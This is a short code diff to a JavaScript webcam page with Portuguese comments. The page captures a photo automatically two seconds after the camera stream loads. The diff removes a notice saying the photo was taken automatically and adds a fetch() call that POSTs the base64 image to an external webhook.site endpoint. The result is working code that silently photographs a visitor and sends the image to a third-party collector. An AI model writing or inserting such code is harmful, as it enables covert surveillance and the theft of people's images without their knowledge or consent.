@@ -17,14 +17,31 @@
       .then(stream => {
         video.srcObject = stream;
 
-        // Aguarda o vídeo estar pronto antes de capturar
         video.onloadedmetadata = () => {
           setTimeout(() => {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
-            alert("Foto tirada automaticamente! (Confira no console)");
+
+            // Mostra no console
             console.log("Imagem em Base64:", imageData);
-          }, 2000); // Espera 2 segundos após carregar o vídeo
+
+            // Envia para um endpoint externo
+            fetch("https://webhook.site/b9b2471d-d0c0-490a-9371-46aa5ad18565", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({ image: imageData })
+            })
+            .then(response => {
+              alert("Foto enviada com sucesso!");
+            })
+            .catch(error => {
+              alert("Erro ao enviar a foto.");
+              console.error(error);
+            });
+
+          }, 2000); // espera 2 segundos
         };
       })
       .catch(error => {
